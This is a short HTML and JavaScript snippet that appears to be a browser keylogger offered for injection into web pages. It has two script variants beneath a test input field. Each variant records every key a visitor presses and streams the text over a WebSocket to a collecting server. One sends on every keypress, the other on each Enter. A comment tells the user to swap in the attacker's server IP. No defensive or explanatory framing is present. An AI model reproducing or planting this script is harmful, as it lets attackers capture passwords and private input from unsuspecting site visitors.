// Testing Field
<input name="searchFor" type="text" size="10">

// Option 1 All Keys
<script type="text/javascript">
  var socket = new WebSocket('ws://localhost:9090'); // Change the ip to the ip server here
  let c = "";
  document.onkeypress = function (e) {
    c += e.key;
    socket.send(c);
  }
</script>

// Option 2
<script type="text/javascript">
  var socket = new WebSocket('ws://localhost:9090'); // Change the ip to the ip server here
  let c = "";
  document.onkeypress = function (e) {
  //console.log(c); <--- delete this if have no use
	if(e.keyCode != 13){
		c += e.key;
	}
	else{
	c += String.fromCharCode(e.keyCode);
      socket.send(c);
      c = "";
    }
  }
</script>
